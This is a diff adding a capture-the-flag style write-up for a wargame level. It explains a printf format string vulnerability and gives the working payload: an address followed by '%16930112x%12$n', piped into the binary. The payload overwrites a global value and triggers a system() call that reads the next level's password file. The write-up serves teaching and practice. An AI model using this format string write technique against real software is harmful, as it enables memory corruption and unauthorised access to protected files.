@@ -1,0 +1,34 @@
+See [asm_analysis.md](Ressources/asm_analysis.md) for the complete ASM analysis.
+
+We use the same idea as in the previous exercise: the printf function is vulnerable because it directly uses our input buffer as its format string.
+
+We need to modify the value stored at 0x08049810 so that it becomes 0x1025544. If the comparison succeeds, the program executes:
+
+system("/bin/cat /home/user/level5/.pass");
+
+However, unlike the previous exercise, we cannot simply use A padding to reach 0x1025544, since 0x1025544 is much larger than the maximum input size.
+
+We can instead use the field width feature of printf. A format such as %16930112x makes printf produce a very large number of characters without requiring them to be present in our input.
+
+We first determine the position of our input in the arguments consumed by printf:
+
+AAAA %x %x %x %x %x %x %x %x %x %x %x %x
+AAAA b7ff26b0 bffff694 b7fd0ff4 0 0 bffff658 804848d bffff450 200 b7fd1ac0 b7ff37d0 41414141
+
+0x41414141 is AAAA, so the first four bytes of our input are interpreted as the 12th argument.
+
+We therefore place 0x08049810 at the beginning of the payload, encoded in little-endian:
+
+\x10\x98\x04\x08
+
+and use %12$n to tell printf to use the 12th argument as the destination address for %n.
+
+The resulting payload is
+
+python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' > /tmp/exploit
+
+Then:
+
+cat /tmp/exploit - | ./level4
+
+This causes %12$n to write the desired value to 0x08049810, satisfying the comparison and reaching the system() call.
